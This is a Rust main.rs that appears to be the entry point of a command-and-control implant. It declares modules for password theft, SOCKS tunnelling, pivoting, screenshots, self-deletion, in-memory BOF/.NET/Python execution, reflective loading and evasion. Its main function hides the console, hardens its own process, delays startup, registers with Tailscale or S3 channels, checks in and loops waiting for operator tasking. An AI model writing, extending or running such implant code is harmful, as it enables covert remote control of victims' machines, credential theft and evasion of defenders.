#![cfg_attr(feature = "no_console", windows_subsystem = "windows")]

mod config;
mod checkin;
mod transport;
mod s3_transport;
#[cfg(feature = "tailscale")]
mod tailscale_transport;
mod crypto;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
    pub mod selfdelete;
    pub mod selfclone;
    pub mod loadLoader;
}
mod hellshall;
mod selfprotect;
mod worker;
mod helpers;
mod mem_wipe;
mod reflective_loader;
mod beacon_pack;
mod loader_cache;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 2 {
        match args[1].as_str() {
            "--worker-py" => {
                worker::run_py_worker();
                return;
            }
            _ => {}
        }
    }

    selfprotect::set_process_security_descriptor();
    helpers::startup_delay();

    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        loop {
            match tailscale_transport::init() {
                Ok(_) => break,
                Err(_) => { helpers::idle(); }
            }
        }
    }

    if config::use_s3 {
        loop {
            match s3_transport::register() {
                Ok(_) => break,
                Err(_) => { helpers::idle(); }
            }
        }
    }

    checkin::checkin();

    loop {
        let _ = tasking::getTasking();
        helpers::idle();
    }
}
